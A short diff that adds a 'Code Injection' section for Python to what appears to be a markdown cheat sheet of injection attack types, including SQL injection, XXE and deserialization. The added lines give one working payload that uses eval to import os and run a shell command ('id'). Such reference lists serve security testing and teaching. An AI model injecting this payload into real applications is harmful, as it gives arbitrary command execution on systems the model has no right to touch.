@@ -7,6 +7,13 @@
 - SQL Injection
 - XML External Entity
 
+# Code Injection
+
+## Python
+
+Eval Command Execution
+`eval("__import__('os').system('id')")`
+
 # Deserialization Injection
 
 ## JavaScript
